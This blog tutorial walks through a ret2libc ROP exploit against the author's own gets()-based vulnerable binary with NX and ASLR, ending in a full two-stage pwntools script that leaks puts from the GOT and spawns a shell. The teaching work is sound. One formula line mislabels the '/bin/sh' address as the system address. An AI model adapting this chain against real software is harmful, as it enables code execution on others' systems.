---
published: true
---

Hola people, today lets try to pwn a binary which has NX/DEP protection and the machine has ALSR enabled. I have written a simple C program which utilizes the vulnerable function gets to read the user input. The user input is read into the variable 'a' which is an array of 20 characters.
<br>
<p align="center">
  		<img width="400" height="250" src="https://fir3wa1-k3r.github.io/imgs/pwn_1.png">
</p>
<br>
When we run the file command on the compiled binary we see that its a 64 bit ELF and is not stipped which means that the debugging symbols are enabled. And the checksec command tells that only the Non executable stack protection (NX) is enabled which means that we can't just put shellcode on the stack and execute it. If we try to do it, we will end up in a segmentation fault.
<br>
<p align="center">
  	<img width="950" height="180" src="https://fir3wa1-k3r.github.io/imgs/pwn_2.png">	
</p>
<br>
Let's run the binary and see what it does. It just ask for the user input and then prints out "Thanks!".
<br>
<p align="center">
  	<img width="280" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_3.png">	
</p>
<br>
Now let's test whether we have a buffer overflow or not (even though we know it exists).
<br>
<p align="center">
  	<img width="550" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_4.png">
</p>
<br>
And yes! we received a 'Segmentation fault' which means that we are trying to read/write to some part of the memory where we don't have permission for it.
 
So, we can find the offset until which we can fill out junk data and whatever is sent after it will overwrite the return address. Let's use gdb to find the offset.
<br>
<p align="center">
  	<img width="814" height="380" src="https://fir3wa1-k3r.github.io/imgs/pwn_5.png">
</p>
<br>
We create a cyclic pattern of 100 characters in length and input that to our vulnerable binary.
<br>
<p align="center">
  	<img width="784" height="430" src="https://fir3wa1-k3r.github.io/imgs/pwn_6.png">
</p>
<br>
The offset is at 40. So, we can fill up junk until 40 character and after which the return address will be modified by data specified by the attacker. Now we have the control of the instruction pointer.

We also see that ALSR is enabled on the server which is why libc's base address gets changed everytime when we run the ldd command on the vulnerable binary.
<br>
<p align="center">
  	<img width="714" height="250" src="https://fir3wa1-k3r.github.io/imgs/pwn_7.png">
</p>
<br>
So, we can try to leak the real address of one of the functions in libc library so that we can calculate the libc's base address and even call other libc function just by knowing their base address. Isn't that cool!!
We use Return Oriented Programming (ROP) method in this post to bypass the NX/DEP protection. It is one of the best attacks which you can use to break NX protection.
From the source code of the vulnerable program we see that puts and gets are the libc function that are called. So, we can try to leak the real address of puts from the Global Offset Table (GOT) and then use that address to calcuate the libc's base address.
For that we need to understand what is PLT and GOT. You can read more about it <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html"> here</a>.

For now, i will quickly explain what do they do. Before a function from the dynamically linked library gets called, its real address is unknown. So, when it is first called, there is a slow lookup function called Procedural Linkage Table (PLT) which will calculate the real address of that function and updates it in the GOT. So, we leverage this activity and try to leak the real address of that function.

Lets get into some action now. We will identify the PLT address for the puts function using the `objdump` utility. 
<br>
<p align="center">
  	<img width="600" height="100" src="https://fir3wa1-k3r.github.io/imgs/pwn_8.png">
</p>
<br>
From the PLT address of the puts fuction we can try to find out the GOT entry for puts. 
<br>
<p align="center">
  	<img width="614" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_9.png">
</p>
<br>
So here the address of the GOT entry for puts is 0x601018. If we try to see what value is present in that location, we see that it is pointing back to the next instruction of the PLT. This is before the real address of puts function is calcuated. We can see later how the real address get populated in the GOT entry when we start executing the vulnerable binary.
<br>
<p align="center">
  	<img width="614" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_9.png">
</p>
<br>
<p align="center">
  	<img width="350" height="40" src="https://fir3wa1-k3r.github.io/imgs/pwn_10.png">
</p>
<br>
You can also see the PLT and GOT memory regions using the command `info files` in the gdb.
<br>
<p align="center">
  	<img width="714" height="550" src="https://fir3wa1-k3r.github.io/imgs/pwn_11.png">
</p>
<br>
Now, lets see how the real address gets populated in the GOT. We set a breakpoint before and after the calling the puts function.
<br>
<p align="center">
  	<img width="614" height="440" src="https://fir3wa1-k3r.github.io/imgs/pwn_12.png">
</p>
<br>
If we execute the binary, we hit our first breakpoint. Now, lets check the contents of GOT entry for the puts function. We see still its pointing to the next instruction of PLT.
<br>
<p align="center">
  	<img width="320" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_13.png">
</p>
<br>
Lets continue executing and then we hit our second breakpoint. Now it is populated with the real address of the puts function after it gets executed.
<br>
<p align="center">
  		<img width="320" height="80" src="https://fir3wa1-k3r.github.io/imgs/pwn_14.png">
</p>
<br>
Now, lets try to leak this address using the ROP gadgets. The gadgets in the ROP are simple the sequence of assembly level instruction which we can leverage to alter the flow of execution of the program. As we all know, in the 64-bit calling convension, the arguments for a function are first populated in the registers and then the function gets called. So, the sequence of registers that store the paramters are RDI, RSI, RDX, RCX etc. So the address of the first, second, third and fourth arguments of a functions will be populated into the RDI, RSI, RDX, RCX etc.

We can use the program called ROPgadget to find the required gadgets.
<br>
<p align="center">
  	<img width="480" height="75" src="https://fir3wa1-k3r.github.io/imgs/pwn_15.png">
</p>
<br>
We choose `pop rdi; ret` gadget so that, the first argument for the function will be popped into RDI and then the ret instruction will tell the CPU to jump to RSP which intern executes the function that is pointed by RSP. Lets get the PLT entry for the main function so that we can call it again to continue our exploitation. If we just call the main function once, it is waste to leak the address of puts as the libc will be loaded to new address everytime our vulnerable binary gets executed. 
<br>
<p align="center">
  	<img width="614" height="39" src="https://fir3wa1-k3r.github.io/imgs/pwn_16.png">
</p>
<br>
Now, lets use the pwntools utility to craft a simple exploit to leak the real address of puts. This is how the exploit look. 
<br>
<p align="center">
  	<img width="614" height="400" src="https://fir3wa1-k3r.github.io/imgs/pwn_17.png">
</p>
<br>
When we execute it we leak the real address of the puts function in libc. 
<br>
<p align="center">
  	<img width="614" height="250" src="https://fir3wa1-k3r.github.io/imgs/pwn_18.png">
</p>
<br>
So, after that we tweak the exploit code to display the leaked address in a nice hex value.
<br>
<p align="center">
  	<img width="614" height="200" src="https://fir3wa1-k3r.github.io/imgs/pwn_19.png">
</p>
<br>
After executing the exploit, we see the leaked real address of puts in hex.
<br>
<p align="center">
  	<img width="614" height="270" src="https://fir3wa1-k3r.github.io/imgs/pwn_20.png">
</p>
<br>
We can calculate the real address where the libc is loaded from the leaked address of puts using some simple calcuations. We also can calculate real addresses of other functions using the same. First we have to identify the offset of the puts function in the libc library. We can use `readelf` command to read the symbols and to display their offset in libc library. We also need the offset of the system function and the string "/bin/sh" so we can try to spawn a shell. strings command can help to identify the offset of the string "/bin/sh" in libc.
<br>
<p align="center">
  	<img width="890" height="185" src="https://fir3wa1-k3r.github.io/imgs/pwn_21.png">
</p>
<br>
Now, we calculate the base and real addresses using the below formula:

libc base address = leaked real puts address - offset of puts
real system address = libc base address + offset of system<br>
real system address = libc base address + offset of "/bin/sh"
<br>
So, here is the overall exploit to pwn the binary and spawn a shell.
<br>
{% highlight ruby %} 
import struct
from pwn import *

# Setup env
elf = ELF("./vuln")
p = elf.process()

# Declarations
pop_rdi_ret = 0x400603		#0x0000000000400603 : pop rdi ; ret
main = 0x400566		#0000000000400566 <main>
puts_plt = 0x400430	#0000000000400430 <puts@plt>
puts_got = 0x601018
puts_offset = 0x6f690		#000000000006f690 puts@@GLIBC_2.2.5
system_offset = 0x45390		#0000000000045390 system@@GLIBC_2.2.5
sh_offset = 0x18cd57		#18cd57 /bin/sh

# Stage-1 Payload
buf = ""
buf += "A" * 40
buf += struct.pack("<Q", pop_rdi_ret)
buf += struct.pack("<Q", puts_got)
buf += struct.pack("<Q", puts_plt)
buf += struct.pack("<Q", main)

# Send Stage-1
p.recvuntil("Enter your name:")
p.sendline(buf)
p.recvline()
p.recvline()
leaked_puts = u64( p.recvline().strip().ljust(8,"\x00"))
log.info("Leaked address of puts: " + str(hex(leaked_puts)))

# Calculate real addresses
libc_base_addr = leaked_puts - puts_offset
libc_system = libc_base_addr + system_offset
libc_sh = libc_base_addr + sh_offset

log.info("Base address of libc: " + str(hex(libc_base_addr)))
log.info("Real address of system in libc: " + str(hex(libc_system)))
log.info("Real address of sh in libc: " + str(hex(libc_sh)))

# Stage-2 Payload
buf = ""
buf += "A" * 40
buf += struct.pack("<Q", pop_rdi_ret)
buf += struct.pack("<Q", libc_sh)
buf += struct.pack("<Q", libc_system)

# Send Stage-2
#p.recvuntil("Enter your name:")
p.sendline(buf)
p.recv()

p.interactive()
{% endhighlight %}
<br>
So, when we execute the exploit, it first leaks the real address of puts from the GOT in stage 1 and then calculate the real address of system and "/bin/sh". Finally it calls the system function with "/bin/sh" as the argument to it using the same `pop rdi; ret` gadget.
<br>
<p align="center">
  	<img width="590" height="340" src="https://fir3wa1-k3r.github.io/imgs/pwn_22.png">
</p>
<br>
